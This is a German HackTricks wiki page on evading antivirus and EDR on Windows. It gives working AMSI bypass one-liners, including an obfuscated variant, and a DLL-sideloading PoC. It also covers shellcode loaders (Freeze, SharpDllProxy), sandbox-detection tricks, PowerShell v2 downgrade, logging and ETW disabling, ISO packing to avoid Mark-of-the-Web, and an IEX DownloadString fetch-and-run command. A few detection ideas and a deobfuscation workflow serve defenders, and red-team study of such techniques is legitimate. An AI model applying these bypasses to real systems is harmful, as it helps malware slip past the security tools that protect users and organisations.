# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Betrieb zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender außer Betrieb zu setzen, indem ein anderes AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und bei den fortgeschritteneren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Statische Erkennung funktioniert, indem bekannte bösartige Strings oder Byte-Arrays in einer Binärdatei oder einem Script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. File Description, Company Name, digitale Signaturen, Icon, Checksum, etc.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich leichter auffliegen lassen kann, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Wege, um diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du die Binärdatei verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen, aber du benötigst einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es aus, einige Strings in deiner Binärdatei oder deinem Script zu ändern, um die AV zu umgehen, aber das kann je nach dem, was du verschleiern willst, zeitaufwendig sein.

- **Custom tooling**

Wenn du deine eigenen Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das erfordert viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung von Windows Defender zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Wesentlichen in mehrere Segmente auf und lässt Defender jedes einzeln scannen; so kann es dir genau sagen, welche Strings oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamische Analyse**

Dynamische Analyse ist, wenn das AV deine Binärdatei in einer Sandbox ausführt und nach bösartigem Verhalten Ausschau hält (z. B. das Entschlüsseln und Auslesen von Browser-Passwörtern, das Erstellen eines Minidumps von LSASS, etc.). Dieser Teil kann etwas komplizierter sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann das eine gute Methode sein, die dynamische Analyse von AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Benutzer nicht zu unterbrechen, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Üblicherweise haben Sandboxes sehr wenige Ressourcen zur Verfügung (z. B. < 2GB RAM), sonst könnten sie die Maschine des Nutzers verlangsamen. Du kannst hier auch sehr kreativ werden, z. B. indem du die CPU-Temperatur oder sogar die Lüfterdrehzahlen prüfst — nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn du einen Benutzer anpeilen willst, dessen Workstation der Domain "contoso.local" beigetreten ist, kannst du die Domain des Computers prüfen; wenn sie nicht übereinstimmt, kann dein Programm sich beenden.

Es stellt sich heraus, dass der Sandbox-Computername von Microsoft Defender HAL9TH ist. Du kannst also vor der Detonation in deiner Malware den Computername prüfen; wenn der Name HAL9TH ist, befindest du dich in Defenders Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Vorgehen gegen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits erwähnt, werden **öffentliche Tools** früher oder später **entdeckt**, also solltest du dir eine Frage stellen:

Zum Beispiel, wenn du LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann.

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz: Es ist wahrscheinlich eines der, wenn nicht das am stärksten von AVs und EDRs markierten Tools. Während das Projekt selbst super ist, ist es auch ein Alptraum, wenn man versucht, es vor AVs zu verbergen. Also suche einfach nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads zur Umgehung modifizierst, stelle sicher, dass du die automatische Sample-Submission in Defender ausschaltest, und bitte, wirklich, **Lade NIEMALS auf VIRUSTOTAL hoch**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere dieses auf einer VM, versuche, die automatische Sample-Submission auszuschalten, und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, priorisiere die Verwendung von DLLs für Evasion. Nach meiner Erfahrung werden DLL-Dateien üblicherweise deutlich seltener erkannt und analysiert, daher ist es ein einfacher Trick, um in manchen Fällen eine Erkennung zu vermeiden (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie in diesem Bild zu sehen ist, hat ein DLL-Payload von Havoc eine Erkennungsrate von 4/26 bei antiscan.me, während der EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um viel stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und der bösartige Payload nebeneinander platziert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell-Skript prüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking im Verzeichnis "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu erkunden**, diese Technik ist bei richtiger Durchführung ziemlich unauffällig, aber wenn Sie öffentlich bekannte DLL Sideloadable-Programme verwenden, könnten Sie leicht erwischt werden.

Nur dadurch, eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, wird es nicht automatisch Ihren payload laden, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die proxy- (und bösartige) DLL macht, an die originale DLL weiter, bewahrt so die Funktionalität des Programms und ermöglicht gleichzeitig die Ausführung Ihres payload.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcode-Vorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die Proxy-DLL haben eine Erkennungsrate von 0/26 auf [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich empfehle dringend, dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading anzusehen und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das hier Besprochene im Detail zu lernen.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows PE-Module können Funktionen exportieren, die tatsächlich "forwarders" sind: anstatt auf Code zu zeigen, enthält der Exporteintrag eine ASCII-Zeichenfolge der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- Lädt `TargetDll`, falls noch nicht geladen
- Ermittelt `TargetFunc` daraus

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls einschließt, das die Weiterleitung auflöst.

Dies ermöglicht eine indirekte sideloading-Primitive: finde eine signed DLL, die eine Funktion exportiert, die auf einen nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL mit genau dem Namen des weitergeleiteten Zielmoduls im selben Verzeichnis. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch deine DllMain ausgeführt wird.

Beispiel beobachtet auf Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Eine minimale DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Weiterleitung mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst nach dem Ausführen von `DllMain` eine "missing API"-Fehlermeldung

Hinweise zur Suche:
- Konzentriere dich auf forwarded exports, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst forwarded exports mit Tools wie:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sieh dir das Windows 11 Forwarder-Inventar an, um Kandidaten zu finden: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm auslösen bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter user-writable paths
- Durchsetzen von Code-Integritätsrichtlinien (WDAC/AppLocker) und Verweigern von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs durch Nutzung von suspended processes, direct syscalls und alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf eine stealthy Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel — was heute funktioniert, kann morgen erkannt werden. Verlasse dich also niemals auf nur ein Tool; wenn möglich, versuche mehrere evasion-Techniken zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "fileless malware" zu verhindern. Ursprünglich konnten AVs nur **files on disk** scannen; wenn du Payloads **directly in-memory** ausführst, konnte das AV nichts dagegen tun, weil die Sichtbarkeit fehlte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer unverschlüsselten und nicht-obfuskierten Form offengelegt werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Warnung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Achte darauf, dass es `amsi:` voranstellt und anschließend den Pfad zur ausführbaren Datei angibt, von der das Skript gestartet wurde — in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem wegen AMSI im-memory entdeckt.

Außerdem wird ab **.NET 4.8** auch C#-Code über AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])` für in-memory execution. Deshalb wird empfohlen, für in-memory Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder niedriger) zu verwenden, wenn du AMSI evaden möchtest.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit static detections arbeitet, kann das Modifizieren der Skripte, die du laden willst, eine gute Methode sein, um evading detection zu erreichen.

Allerdings kann AMSI Skripte sogar deobfuskieren, selbst wenn mehrere Schichten vorhanden sind, sodass Obfuscation je nach Vorgehensweise keine gute Option sein kann. Das macht das Umgehen nicht so trivial. Manchmal reicht aber schon das Ändern einiger Variablennamen, sodass es vom Flagging abhängt, wie aufwändig es sein muss.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell- (ebenfalls cscript.exe, wscript.exe usw.) Prozess implementiert ist, lässt sich diese DLL sogar als nicht privilegierter Benutzer relativ einfach manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Wege gefunden, AMSI-Scanning zu evaden.

**Forcing an Error**

Das Erzwingen eines Fehlschlags der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um die breite Nutzung einzudämmen.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es bedurfte nur einer Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Modifikation nötig, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht ist; veröffentliche keinen Code, wenn du unentdeckt bleiben willst.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingabe) und deren Überschreiben mit Anweisungen, die den Rückgabewert E_INVALIDARG liefern; dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit PowerShell zu umgehen — siehe [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), um mehr darüber zu erfahren.

Dieses Tool [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) generiert ebenfalls script, um AMSI zu umgehen.

**Entferne die erkannte Signatur**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und diese dann mit NOP instructions überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine scripts ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst Folgendes tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ist eine Funktion, die es ermöglicht, alle auf einem System ausgeführten PowerShell-Befehle zu protokollieren. Das kann nützlich für Auditing und Fehlerbehebung sein, aber es kann auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) dafür verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Starten Sie z. B.: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Nutzen Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell ohne Defenses zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten, was die Entropie der Binary erhöht und AVs/EDRs das Erkennen erleichtert. Seien Sie vorsichtig damit und verschlüsseln Sie ggf. nur spezifische Abschnitte Ihres Codes, die sensibel sind oder versteckt werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Beim Analysieren von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der untenstehende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in C# in Tools wie dnSpy oder ILSpy dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Das ändert außerdem die PE-Checksumme, sodass jede Modifikation die Binary zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu lokalisieren, die XOR-Keys wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol / control-flow recovery – geben Sie die *clean* Datei an **de4dot-cex** (ein ConfuserEx-bewusster Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2 Profil  
• de4dot wird Control-Flow-Flattening rückgängig machen, originale Namespaces, Klassen und Variablennamen wiederherstellen und konstante Strings entschlüsseln.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (sog. *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` sehen, anstelle undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …).

4.  Manual clean-up – führen Sie die resultierende Binary in dnSpy aus, suchen Sie nach großen Base64-Blobs oder der Nutzung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *wirkliche* Payload zu finden. Oft speichert die Malware diese als TLV-kodiertes Byte-Array, initialisiert innerhalb von `<Module>.byte_0`.

Die obige Kette stellt den Ausführungsfluss **wieder her, ohne** die bösartige Probe ausführen zu müssen – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilations-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die `C++11/14`-Sprache nutzt, um zur Kompilierzeit obfuscated code zu erzeugen, ohne ein externes Tool zu verwenden und ohne den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuscated operations hinzu, die vom C++ template metaprogramming framework erzeugt werden und das Leben der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene pe files obfuscaten kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fine-grained code obfuscation framework für LLVM-supported languages unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuscates ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP chains transformiert werden, wodurch unsere natürliche Vorstellung von normalem control flow unterlaufen wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Möglicherweise haben Sie diesen Bildschirm gesehen, wenn Sie ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich auf Basis eines reputationsbasierten Ansatzes. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen, wodurch der Endbenutzer gewarnt wird und die Ausführung der Datei verhindert wird (obwohl die Datei weiterhin über Mehr Informationen -> Trotzdem ausführen ausgeführt werden kann).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Prüfen des Zone.Identifier-ADS einer aus dem Internet heruntergeladenen Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Ein sehr effektiver Weg, zu verhindern, dass Ihre payloads das Mark of The Web erhalten, besteht darin, sie in einen Container wie eine ISO zu packen. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein mächtiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten erlaubt, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** eines user space process so zu manipulieren, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies geschieht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries in den Speicher ist schon seit einiger Zeit bekannt und ist weiterhin eine sehr gute Methode, um deine post-exploitation Tools auszuführen, ohne von AV entdeckt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur um das Patchen von AMSI für den gesamten Prozess kümmern.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Möglichkeiten, dies zu tun:

- **Fork\&Run**

